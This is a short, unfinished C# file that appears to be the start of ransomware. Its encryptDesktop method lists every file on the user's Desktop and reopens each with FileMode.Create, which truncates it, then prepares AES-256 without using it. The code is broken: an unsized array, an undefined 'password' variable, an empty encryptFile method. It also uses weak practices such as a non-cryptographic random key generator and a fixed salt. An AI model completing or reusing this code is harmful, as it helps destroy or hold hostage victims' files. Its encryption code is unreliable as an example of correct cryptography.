using System;
using System.IO;
using System.Linq;
using System.Windows;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;


namespace EncryptionLogic
{
    public class Encryption
    {
	    private static Random random = new Random();
		private static byte[] passwordBytes = new byte[];
	    public string generate256BitKey()
	    {
		    const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";

			try
		    {
			    return new string(Enumerable.Repeat(chars, 256)
				    .Select(s => s[random.Next(s.Length)]).ToArray());
			  
		    }
		    catch (Exception e)
		    {
			    MessageBox.Show(e.Message);
				
		    }
		    return null;
	    }
	    public int encryptDesktop()
	    {
			
		    string filepath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			DirectoryInfo d = new DirectoryInfo(filepath);
		    foreach (var file in d.GetFiles())
		    {
				FileStream fsCrypt = new FileStream(file.Name, FileMode.Create);
			    RijndaelManaged AES = new RijndaelManaged();
			    AES.KeySize = 256;
			    AES.BlockSize = 128;

				var key = new Rfc2898DeriveBytes(password);
		    } 

		    byte[] encryptedBytes = null;

		    byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

			
		    

			return 1;
	    }

	    private void encryptFile()
	    {
		    
	    }
    }
}
